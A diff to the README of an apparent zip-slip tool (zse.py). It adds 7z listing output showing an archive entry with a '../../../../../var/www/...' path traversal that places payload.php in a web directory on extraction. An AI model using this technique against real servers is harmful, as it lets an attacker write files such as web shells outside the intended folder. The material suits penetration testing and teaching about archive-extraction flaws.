@@ -25,6 +25,15 @@ python3 zse.py -d 5 -t var/www/foo/bar payload.php
 ```
 
 this will result in a zip archive that, when extracted, places the `payload.php` file in the `/var/www/foo/bar` directory.
+```sh
+7z l evil.zip
+[...]
+   Date      Time    Attr         Size   Compressed  Name
+------------------- ----- ------------ ------------  ------------------------
+2025-04-25 09:35:21 .....            5            5  ../../../../../var/www/foo/bar/payload.php
+------------------- ----- ------------ ------------  ------------------------
+[...]
+```
 
 ### license
 ---
